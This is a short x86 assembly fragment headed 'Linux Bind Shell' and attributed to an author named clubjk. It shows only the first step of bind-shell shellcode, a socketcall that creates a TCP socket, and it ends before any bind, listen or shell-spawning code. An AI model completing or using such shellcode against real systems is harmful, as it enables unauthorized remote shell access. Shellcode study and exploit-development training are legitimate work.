; Linux Bind Shell
; Author: clubjk 
 
global _start
 
section .text
 
_start:

	xor eax, eax
	mov eax, 0x66

	xor ebx, ebx
	mov ebx, 0x1

	xor esi, esi
	push esi
	push ebx
	push 0x2
	
	xor ecx, ecx
	mov ecx, esp

	int 0x80  
